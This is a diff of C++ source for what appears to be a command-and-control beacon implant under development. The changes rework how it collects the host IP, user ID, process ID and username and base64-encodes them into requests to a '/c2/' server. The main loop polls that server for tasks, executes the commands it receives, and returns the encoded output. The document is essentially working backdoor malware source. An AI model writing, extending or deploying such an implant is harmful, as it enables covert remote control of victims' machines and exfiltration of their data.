@@ -1,61 +1,12 @@
-#include <string>
-#include <iostream>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <vector>
-#include <string.h>
-#include <crypt.h>
-#include <sys/stat.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <ctype.h>
-#include <pwd.h>
-#include <netdb.h>
-#include <ifaddrs.h>
-#include<sys/time.h> 
-#include <sys/select.h>
 
-#define RESPONSE_MAX_BUFFER 500
-#define CHECK_ALIVE_TIMEOUT 5
-#define HEARTBEAT_TIME 1
-
-enum TASK{ EXEC_COMMAND = 1, SET_TIMEOUT = 2, NO_TASK = 0};
-
-
-typedef struct tasks_pack
-{
-    /* data */
-    std::string task_id;
-    enum TASK task_type; 
-}Task_PACK;
-
-typedef struct beacon_packet
-{
-    /* data */
-    std::string uid;
-    std::string ip;
-    std::string pid;
-    std::string uuid;
-}beacon;
+#include "include/b64.h"
+#include "include/Beacon.h"
 
 int g_time_alive = HEARTBEAT_TIME;
 beacon g_current_beacon;
 std::string g_online_uri = "/online/";
 std::string g_task_uri = "/c2/";
 
-
-int connect_socket(char * host, unsigned int port);
-int send_get_msg(int sock,const char * uri);
-int send_post_msg(int sock,const char * uri);
-int recv_response(int sock, std::string & response);
-int send_beacon_info(int sock);
-int send_task_result(int sock, std::string task_id ,std::string task_result);
-int send_header_msg(int sock, std::vector<std::string> headers);
-std::string get_local_ip();
-Task_PACK get_task(std::string response, std::string & task_data);
-std::string handle_task(Task_PACK task  , std::string task_data);
-std::string task_exec_command(std::string data);
-std::string find_value_by_key(std::string data, std::string key);
 
 std::vector<std::string> g_headers = {
     "Host: 127.0.0.1:5000\r\n",
@@ -178,23 +129,22 @@ Task_PACK get_task(std::string response, std::string & task_data){
     return task_pack;
 }
 
-std::string get_local_ip() {
-    std::string interface_ip;
-    char ip[16];
-    struct ifaddrs *ifAddrStruct;
-    void * tmpAddrPtr=NULL;
+// 获取第一个IP
+unsigned int get_local_ip() {
+    std::vector<unsigned int> iplist;
+    unsigned int addr = 0;
+    struct ifaddrs *ifAddrStruct, * ifaddrs;
     getifaddrs(&ifAddrStruct);
-    while (ifAddrStruct != NULL) {
-        if (ifAddrStruct->ifa_addr->sa_family==AF_INET) {
-            tmpAddrPtr=&((struct sockaddr_in *)ifAddrStruct->ifa_addr)->sin_addr;
-            inet_ntop(AF_INET, tmpAddrPtr, ip, INET_ADDRSTRLEN);
-            interface_ip.append(ip);
-            interface_ip.append("|");
+    ifaddrs = ifAddrStruct;
+    while(ifaddrs->ifa_next != NULL){
+        if(ifaddrs->ifa_addr->sa_family == AF_INET) {
+            struct sockaddr_in *s = (struct sockaddr_in *) ifaddrs->ifa_addr;
+            addr = ntohl(s->sin_addr.s_addr);
         }
-        ifAddrStruct=ifAddrStruct->ifa_next;
+        ifaddrs = ifaddrs->ifa_next;
     }
     freeifaddrs(ifAddrStruct);
-    return interface_ip;
+    return addr;
 }
 
 int check_socket_alive(int sock){
@@ -232,33 +182,41 @@ int send_task_result(int sock, std::string task_id ,std::string task_result){
     return 0;
 }
 
+/*
+ * send_beacon_info
+ */
 int send_beacon_info(int sock){
+
+    BEACON_META_DATA * beacon_meta_data = new BEACON_META_DATA();
     int ret = 0;
-    __uid_t uid = getuid();
-    char * uid_str = new char[5];
-    char * pid_str = new char[5];
-    struct stat fbase;
     std::string newuri = g_online_uri;
-    // read username from passwd file
     struct passwd *user;
-    user = getpwuid(uid);
-    // current beacon info
-    sprintf(uid_str,"%d",uid);
-    sprintf(pid_str,"%d",getpid());
-    g_current_beacon.uid = user->pw_name;
-    g_current_beacon.uid.append("|");
-    g_current_beacon.uid.append(uid_str);
-    g_current_beacon.ip = get_local_ip();
-    g_current_beacon.pid = pid_str;
-   
-    newuri.append("?uid=" + g_current_beacon.uid);
-    newuri.append("&pid=" + g_current_beacon.pid);
-    newuri.append("&ip=" + g_current_beacon.ip);
+    char * meta_data_str = NULL;
+
+    // *******************************************
+    beacon_meta_data->ip = get_local_ip();
+    beacon_meta_data->uid = getuid();
+    beacon_meta_data->pid = getpid();
+    user = getpwuid(beacon_meta_data->uid);
+    // *******************************************
+
+    int u_len = strlen(user->pw_name);
+    if(u_len > USERNAME_LEN){
+        // 防止缓冲区溢出
+        u_len = USERNAME_LEN -1;
+    }
+    strncpy(beacon_meta_data->username, user->pw_name, u_len);
+    meta_data_str = b64_encode((unsigned char *)beacon_meta_data, sizeof(BEACON_META_DATA));
+    newuri.append("?data=");
+    newuri.append(meta_data_str);
     std::cout << "[+]URI : " << newuri << std::endl;
     ret = send_get_msg(sock, newuri.data());
     send_header_msg(sock, g_headers);
-    return fbase.st_size;
+    free(meta_data_str);
+    meta_data_str = NULL;
+    return ret;
 }
+
 
 int recv_response(int sock, std::string & response){
     std::string response_data;
@@ -290,7 +248,6 @@ int recv_response(int sock, std::string & response){
         return -1;
     }
     response_data = response.substr(pos+4);
-    std::cout << "-------------- Response : " << response_data<< std::endl;
     response = response_data;
     return response.length();
 }
@@ -312,9 +269,7 @@ int send_get_msg(int sock,const char * uri){
 int send_header_msg(int sock, std::vector<std::string> headers){
     for (auto i = headers.begin(); i < headers.end(); ++i)
     {
-        /* code */
-        // std::cout << *i << std::endl;
-        int ret = send(sock, i->c_str(), i->length(), 0);
+        send(sock, i->c_str(), i->length(), 0);
     }
     return 0;
 }
@@ -344,23 +299,25 @@ int main(){
     while(check_socket_alive(sock) > 0){
         sleep(g_time_alive);
         std::string task_data;
-        std::cout << "[*]Sleep " << g_time_alive << std::endl;
+        std::cout << "[*]HeartBeat " << g_time_alive << std::endl;
         send_beacon_info(sock);
         int response_data_len = recv_response(sock,response);
         if(response_data_len <= 0 ){
             response.clear();
             continue;
         }
-        std::cout <<"[+]Response : " << response<< std::endl;
-        
         Task_PACK task = get_task(response, task_data);
         if(task.task_type == NO_TASK){
             response.clear();
             continue;
         }
         task_data = handle_task(task, task_data);
-        std::cout <<"[+]Send Data : " << task_data << " task id : " << task.task_id << std::endl;
-        send_task_result(sock, task.task_id, task_data.replace(task_data.find("\n"),1," "));
+        char * encode_data = b64_encode((unsigned char *)task_data.c_str(),task_data.length());
+        std::string encode_string = encode_data;
+        free(encode_data);
+        encode_data = NULL;
+        std::cout <<"[+]Send Data : " << task_data.substr(0,30) <<".... " << " Task ID : " << task.task_id << std::endl;
+        send_task_result(sock, task.task_id, encode_string);
         response.clear();
     }
     shutdown(sock,SHUT_RDWR);
@@ -380,3 +337,18 @@ int xmain(){
 }
 */
 
+int txmain(){
+
+    /*
+    struct beacon_meta_data * beaconMetaData = new beacon_meta_data();
+    memset(beaconMetaData, 0 , sizeof(beaconMetaData));
+    strncpy(beaconMetaData->username,"12113",5);
+
+    std::cout << "size of :" << sizeof(beacon_meta_data) << std::endl;
+    std::cout << b64_encode((unsigned char *)beaconMetaData, sizeof(beacon_meta_data)) << std::endl;
+    */
+    send_beacon_info(1);
+
+    // send_beacon_info(1);
+  return 0;
+}
